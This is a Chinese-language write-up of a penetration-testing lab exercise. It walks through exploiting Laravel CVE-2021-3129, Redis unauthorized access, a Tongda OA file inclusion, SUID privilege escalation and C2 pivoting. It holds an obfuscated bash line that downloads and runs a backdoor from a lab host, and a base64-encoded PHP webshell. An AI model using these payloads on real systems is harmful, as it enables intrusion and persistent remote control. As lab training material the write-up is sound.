1
启元学堂REDV靶场练习
环境部署
⼯具
Start
看readme即可
X-C2
冰蝎3
webanalyzer
...
⼊⼝点：http://192.168.88.101/
环境部署
⼯具
Start
2
看下指纹，⾁眼看上去就是hexo
1     {
2         "name": "Hexo",
3         "version": "5.3.0",
3
⽬录扫描
没什么东⻄
4         "detail": "regex \"Hexo(?: v?([\\d.]+))?\" match meta[gene
rator] of http://192.168.88.101/",
5         "origin": "wappalyzer"
6     },
4
web1上⾯81端⼝还有服务
应该要⽤CVE-2021-3129打
tips:
攻击的结果基本所有脚本都是写在laravel.log，但是这个路径在实战中很有可能是不存在的，需要去猜。
我是⽤mac测试的，因为payload貌似不能换⾏，需要加-w0
https://stackoverflow.com/questions/46463027/base64-doesnt-have-w-option-in-mac
这上⾯说的是mac下的-w0是默认的，还是不⾏，只能换linux。
5
这个漏洞如果找不到log路径，可以配合fastcgi或者redis打。
把脚本改⼀下，找到利⽤链之后⽀持⾃定义命令
6
中后⻔。
1 bash=bash -c {echo,Y2QgL3RtcC8gJiYgY3VybCBodHRwOi8vMTkyLjE2OC44OC4
xMDA6ODA4MS93ZWIxICAtbyBuZ2lueCAmJiBjaG1vZCAreCBuZ2lueCAmJiAuL25na
W54}|{base64,-d}|{bash,-i}
7
发现是不出⽹的，我配置的⽹络环境只允许dmz出⽹。
写冰蝎⻢
1 echo PD9waHAKQGVycm9yX3JlcG9ydGluZygwKTsKc2Vzc2lvbl9zdGFydCgpOwogI
CAgJGtleT0iZTQ1ZTMyOWZlYjVkOTI1YiI7IC8v6K+l5a+G6ZKl5Li66L+e5o6l5a+
G56CBMzLkvY1tZDXlgLznmoTliY0xNuS9je+8jOm7mOiupOi/nuaOpeWvhueggXJlY
mV5b25kCgkkX1NFU1NJT05bJ2snXT0ka2V5OwoJc2Vzc2lvbl93cml0ZV9jbG9zZSg
pOwoJJHBvc3Q9ZmlsZV9nZXRfY29udGVudHMoInBocDovL2lucHV0Iik7CglpZighZ
Xh0ZW5zaW9uX2xvYWRlZCgnb3BlbnNzbCcpKQoJewoJCSR0PSJiYXNlNjRfIi4iZGV
jb2RlIjsKCQkkcG9zdD0kdCgkcG9zdC4iIik7CgkJCgkJZm9yKCRpPTA7JGk8c3Ryb
GVuKCRwb3N0KTskaSsrKSB7CiAgICAJCQkgJHBvc3RbJGldID0gJHBvc3RbJGldXiR
rZXlbJGkrMSYxNV07IAogICAgCQkJfQoJfQoJZWxzZQoJewoJCSRwb3N0PW9wZW5zc
8
2xfZGVjcnlwdCgkcG9zdCwgIkFFUzEyOCIsICRrZXkpOwoJfQogICAgJGFycj1leHB
sb2RlKCd8JywkcG9zdCk7CiAgICAkZnVuYz0kYXJyWzBdOwogICAgJHBhcmFtcz0kY
XJyWzFdOwoJY2xhc3MgQ3twdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoJHApIHtldmF
sKCRwLiIiKTt9fQogICAgQGNhbGxfdXNlcl9mdW5jKG5ldyBDKCksJHBhcmFtcyk7C
j8+Cg==|base64 -d > /var/www/html/wfox_coolcat.php
9
然后
是个docker
10
补充⼀下查看ip的命令
 1 curl ifconfig.me
 2 curl -4/-6 icanhazip.com
 3 curl ipinfo.io/ip
 4 curl api.ipify.org
 5 curl checkip.dyndns.org
 6 dig +short myip.opendns.com @resolver1.opendns.com
 7 host myip.opendns.com resolver1.opendns.com
 8 curl ident.me
 9 curl bot.whatismyipaddress.com
10 curl ipecho.net/plain
11
12 The following commands will get you the private IP address of you
r interfaces:
13 ifconfig -a
14 ip addr (ip a)
15 hostname -I | awk '{print $1}'
16 ip route get 1.2.3.4 | awk '{print $7}'
11
很崩溃啊，实际中遇到⽹段是啥都不知道。
可以找找配置⽂件
这台是个docker，正常点的机器应该可以⽤，写poc的时候涉及到命令执⾏的时候就需要个通⽤点的⽅法
去证明漏洞存在（⽆回显的情况）。
看了writeup才知道，考点是docker逃逸。
cdk还没⽤过，⽤了没啥效果
17 (Fedora) Wifi-Settings→ click the setting icon next to the Wifi n
ame that you are connected to → Ipv4 and Ipv6 both can be seen
18 nmcli -p device show
12
writeup是suid提权
1 find / -perm -u=s -type f 2 >/dev/null
13
执⾏的是ps，利⽤$PATH获得root权限。
参考这篇⽂章学习
理解Docker容器逃逸
简单dockers逃逸学习
LInux SUID提权利⽤
14
有CVE-2019-5736的洞，⽤cdk没打成功。
这台机器是在第⼆层⽹络，然后⼜不出⽹，拿到宿主机权限之后还没法做代理。亦或是只能做正向代理。
为了⽅便⽤的⼀层的靶机吧，通过redis未授权写⼊redis key
1 (echo -e "\n\n"; cat ~/.ssh/id_rsa.pub; echo -e "\n\n") > key.txt
2 cat key.txt | redis-cli -h 192.168.88.101 -x set xxx
3 config set dir /root/.ssh   
4 config set dbfilename authorized_keys    
5 save  
15
靶场启动的时候记得加sudo，不然没权限写进去。
第⼀台权限：
16
web1的信息收集：
⽹卡信息
last 登录信息
17
and so on.....
18
扫描52⽹段
先⽤C2起⼀个socks5代理
1 socks5 --port 1234 --username qqq --password qqq
19
挂burp访问
前⾯指纹识别是通达OA
判断版本
http://192.168.52.30:8080/inc/expired.php
20
利⽤任意⽤户登录到后台⽂件包含RCE
拿到session之后上传jpg+⽂件包含
⽂件包含的时候写⼊⼀个新的webshell
21
设置代理连接webshell
22
C2⽀持tcp-pivot
⽣成后⻔上传执⾏
23
在这⾥⼜发现新的⽹段。
还有admin的进程
24
迁移过去或者抓密码都⾏。
⼿⼯测试了⼀下tcp-pivot。还是⽐较稳定的。
第⼀层⽹络到后⾯的不管多少层，都是可以串联攻击。
25
后⾯的不想测试了，只要是测试C2代理的稳定性和tcp-pivot。